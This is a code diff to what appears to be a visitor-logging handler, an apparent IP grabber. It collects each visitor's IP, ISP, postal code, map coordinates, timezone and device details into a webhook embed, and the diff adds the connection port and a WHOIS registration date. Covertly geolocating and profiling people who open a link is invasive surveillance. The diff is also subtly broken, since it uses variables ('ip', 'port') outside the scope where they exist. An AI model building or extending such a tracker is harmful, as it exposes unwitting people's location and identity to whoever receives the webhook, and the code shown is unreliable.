@@ -101,6 +101,8 @@ function getOperatingSystem(userAgent) {
     return 'Unknown';
 }
 
+const whoisDetails = await fetch(`https://jsonwhoisapi.com/api/v1/whois?identifier=${ip}`).then(res => res.json());
+const registrationDate = whoisDetails.created_date || "Not available";
 
 
 function logDebugInfo(reverseDNS) {
@@ -119,7 +121,9 @@ function createCommonFields(
     // Fields array
     return [
         { name: "IP", value: safeValue(ipDetails.query, "Not available"), inline: true },
+        { name: "Port", value: `\`${port}\``, inline: true },
         { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
+        { name: "Registration Date", value: `\`${registrationDate}\``, inline: true },
         { name: "Organization", value: safeValue(ipDetails.org), inline: true },
         { name: "ASN", value: safeValue(ipDetails.as), inline: true },
         { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
@@ -130,7 +134,6 @@ function createCommonFields(
         { name: "Postal Code", value: safeValue(ipDetails.zip), inline: true },
         { name: "Coords", value: coords || "`Not available`", inline: true },
         { name: "Timezone", value: safeValue(ipDetails.timezone), inline: true },
-        { name: "Reverse DNS", value: safeValue(reverseDNS, "N/A"), inline: false },
         { name: "Device Info", value: safeValue(userAgent), inline: false },
         { name: "Device Type", value: safeValue(deviceType), inline: true },
         { name: "Operating System", value: safeValue(os), inline: true },
@@ -184,6 +187,10 @@ export default async function handler(req, res) {
         const coords = ipDetails.lat && ipDetails.lon
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
+
+
+        const protocol = req.protocol || (req.connection.encrypted ? "https" : "http");
+        const port = req.headers['x-forwarded-port'] || req.connection.localPort;
 
 
         // Perform reverse DNS lookup
@@ -331,10 +338,10 @@ export default async function handler(req, res) {
                     referer,
                     reverseDNS
                 );
-                
+
                 // Output or use the fields
                 console.log(fields);
-                
+
                 // Example: Use the fields in a webhook message
                 const message = {
                     embeds: [
